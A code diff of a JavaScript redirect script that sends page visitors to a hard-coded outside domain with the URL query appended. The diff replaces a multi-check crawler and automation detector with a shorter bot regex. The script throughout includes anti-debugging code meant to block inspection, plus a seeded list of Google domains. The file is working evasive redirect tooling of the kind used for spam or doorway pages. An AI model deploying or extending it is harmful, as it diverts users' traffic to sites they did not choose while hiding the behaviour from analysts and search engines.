@@ -1,130 +1,10 @@
-// Advanced Redirect Script with Enhanced Google Bot Detection
-// Multi-layer bot detection + Anti-debug protection
+// Advanced Redirect Script with Bot Detection & Anti-Debug
+// Redirects to specified domain with 's' parameter
 
 (function() {
     'use strict';
     
-    // ========== ADVANCED BOT DETECTION ==========
-    function advancedBotDetection() {
-        const userAgent = navigator.userAgent.toLowerCase();
-        const referrer = document.referrer.toLowerCase();
-        
-        let detection = {
-            isBot: false,
-            confidence: 0,
-            botType: 'unknown',
-            checks: []
-        };
-        
-        // Check 1: User Agent patterns
-        const botPatterns = {
-            googlebot: /googlebot|google-inspectiontool|google page speed insights|google web preview|google-structureddatatestingtool/i,
-            bingbot: /bingbot|msnbot|bingpreview/i,
-            yandex: /yandexbot|yandex/i,
-            baidu: /baiduspider|baidu/i,
-            facebook: /facebookexternalhit|facebot/i,
-            generic: /bot|crawler|spider|scraper|crawling|slurp|mediapartners|adsbot|feedfetcher|bytedance|tiktok|telegram/i
-        };
-        
-        for (let [type, pattern] of Object.entries(botPatterns)) {
-            if (pattern.test(userAgent)) {
-                detection.isBot = true;
-                detection.botType = type;
-                detection.confidence += 35;
-                detection.checks.push('UA:' + type);
-                break;
-            }
-        }
-        
-        // Check 2: WebDriver detection
-        if (navigator.webdriver) {
-            detection.isBot = true;
-            detection.confidence += 30;
-            detection.checks.push('webdriver');
-        }
-        
-        // Check 3: Headless browser
-        if (/HeadlessChrome|PhantomJS/i.test(userAgent)) {
-            detection.isBot = true;
-            detection.confidence += 35;
-            detection.checks.push('headless');
-        }
-        
-        // Check 4: Chrome without window.chrome
-        if (!window.chrome && /Chrome/i.test(userAgent)) {
-            detection.confidence += 15;
-            detection.checks.push('fake-chrome');
-        }
-        
-        // Check 5: No plugins
-        if (typeof navigator.plugins === 'undefined' || navigator.plugins.length === 0) {
-            detection.confidence += 10;
-            detection.checks.push('no-plugins');
-        }
-        
-        // Check 6: Invalid screen dimensions
-        if (screen.width === 0 || screen.height === 0 || screen.colorDepth === 0) {
-            detection.confidence += 25;
-            detection.checks.push('invalid-screen');
-        }
-        
-        // Check 7: No referrer (suspicious but not conclusive)
-        if (referrer === '') {
-            detection.confidence += 5;
-            detection.checks.push('no-referrer');
-        }
-        
-        // Check 8: Missing languages
-        if (typeof navigator.languages === 'undefined' || navigator.languages.length === 0) {
-            detection.confidence += 10;
-            detection.checks.push('no-languages');
-        }
-        
-        // Check 9: Automated tools detection
-        if (window.callPhantom || window._phantom || window.__phantomas) {
-            detection.isBot = true;
-            detection.confidence += 40;
-            detection.checks.push('phantom');
-        }
-        
-        // Check 10: Selenium detection
-        if (window.document.__selenium_unwrapped || window.document.__webdriver_evaluate || window.document.__driver_evaluate) {
-            detection.isBot = true;
-            detection.confidence += 40;
-            detection.checks.push('selenium');
-        }
-        
-        // Check 11: Performance timing anomalies
-        if (window.performance && window.performance.timing) {
-            const timing = window.performance.timing;
-            const loadTime = timing.loadEventEnd - timing.navigationStart;
-            
-            // Bots might have unusual load times
-            if (loadTime < 100 || loadTime === 0) {
-                detection.confidence += 15;
-                detection.checks.push('fast-load');
-            }
-        }
-        
-        // Check 12: Mouse/Touch capability
-        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        const hasMouse = matchMedia('(pointer:fine)').matches;
-        
-        if (!hasTouch && !hasMouse) {
-            detection.confidence += 10;
-            detection.checks.push('no-input');
-        }
-        
-        // Final decision: if confidence >= 50, consider as bot
-        if (detection.confidence >= 50 && !detection.isBot) {
-            detection.isBot = true;
-            detection.botType = 'suspicious';
-        }
-        
-        return detection;
-    }
-    
-    // ========== ANTI-DEBUG PROTECTION ==========
+    // Anti-debugging protection
     const antiDebugProtection = (function() {
         let debugCheck = true;
         return function(context, fn) {
@@ -140,6 +20,7 @@
         };
     })();
     
+    // Initialize anti-debug
     (function() {
         antiDebugProtection(this, function() {
             const functionTest = new RegExp('function *\\( *\\)');
@@ -154,6 +35,7 @@
         })();
     })();
     
+    // Main debugger check function
     function debuggerCheck(action) {
         function checkLoop(counter) {
             if (typeof counter === 'string') {
@@ -177,18 +59,23 @@
         } catch (e) {}
     }
     
-    // ========== MAIN REDIRECT LOGIC ==========
+    // Get current domain
     let currentDomain = window.location.hostname;
     document.title = currentDomain;
     
+    // Check if URL has query parameters
     if (window.location.href.includes('?')) {
         let urlParts = window.location.href.split('?');
+        let userAgent = navigator.userAgent.toLowerCase();
         
         if (urlParts[1]) {
+            // Get the parameter value from URL
             let paramValue = urlParts[1];
+            
+            // Create seed from domain for shuffling
             let seed = combineSeedAndSecret(currentDomain);
             
-            // Google domains list
+            // List of referrer sources for tracking (can be expanded)
             let referrerSources = [
                 'google.com', 'google.ad', 'google.ae', 'google.com.af', 'google.com.ag',
                 'google.al', 'google.am', 'google.co.ao', 'google.com.ar', 'google.as',
@@ -230,44 +117,40 @@
                 'google.co.zw'
             ];
             
+            // Shuffle referrer sources with seed
             const shuffle = createShuffleWithSeed(seed);
             let shuffledReferrers = shuffle(referrerSources);
             
-            // TODO: Replace with your domain
+            // TODO: Replace with your actual domain
             let targetDomain = 'https://mifans.info';
             
-            // Run advanced bot detection
-            const botDetection = advancedBotDetection();
+            // Bot detection regex
+            const botRegex = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|facebook|yandex|spider|bytedance|ali/i;
             
-            // Build redirect URL based on detection
-            let redirectUrl;
-            let trafficType;
-            
-            if (botDetection.isBot) {
-                // Detected as bot
-                trafficType = 'bot';
-                redirectUrl = targetDomain + '/' + paramValue;
-            } else if (document.referrer.toLowerCase().includes('google')) {
-                // Traffic from Google (human)
-                trafficType = 'google';
+            // Check if it's a bot or has no referrer
+            if (botRegex.test(userAgent) || document.referrer === '') {
+                // Bot detected or no referrer
+                let redirectUrl = targetDomain + '/' + paramValue;
+                window.location.href = redirectUrl;
+            } else if (document.referrer.includes('google')) {
+                // Traffic from Google
                 const jakartaTime = new Date().toLocaleString('en-US', {'timeZone': 'Asia/Jakarta'});
                 const jakartaDate = new Date(jakartaTime);
                 const timeWIB = Math.floor(jakartaDate.getTime() / 1000);
                 
-                redirectUrl = targetDomain + '/' + paramValue;
+                let redirectUrl = targetDomain + '/' + paramValue;
+                window.location.href = redirectUrl;
             } else {
                 // Regular traffic
-                trafficType = 'direct';
-                redirectUrl = targetDomain + '/' + paramValue;
+                let redirectUrl = targetDomain + '/' + paramValue;
+                window.location.href = redirectUrl;
             }
-            
-            // Perform redirect
-            window.location.href = redirectUrl;
         }
     }
     
-    // ========== HELPER FUNCTIONS ==========
+    // Helper Functions
     
+    // Combine seed and secret to create custom alphabet
     function combineSeedAndSecret(seedString) {
         const cleaned = seedString.replace(/[^a-zA-Z0-9]/g, '');
         const chars = cleaned.split('');
@@ -275,6 +158,7 @@
         return uniqueChars.join('');
     }
     
+    // Hash string to create numeric seed
     function hashStringToSeed(str) {
         let hash = 0;
         for (let i = 0; i < str.length; i++) {
@@ -284,6 +168,7 @@
         return Math.abs(hash);
     }
     
+    // Create seeded random number generator
     function createSeededRandom(seed) {
         return function() {
             let x = Math.sin(seed++) * 10000;
@@ -291,6 +176,7 @@
         };
     }
     
+    // Create shuffle function with seed
     function createShuffleWithSeed(seedString) {
         const numericSeed = hashStringToSeed(seedString);
         
@@ -298,6 +184,7 @@
             const random = createSeededRandom(numericSeed + array.length);
             let shuffled = array.slice();
             
+            // Fisher-Yates shuffle with seeded random
             for (let i = shuffled.length - 1; i > 0; i--) {
                 let j = Math.floor(random() * (i + 1));
                 [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
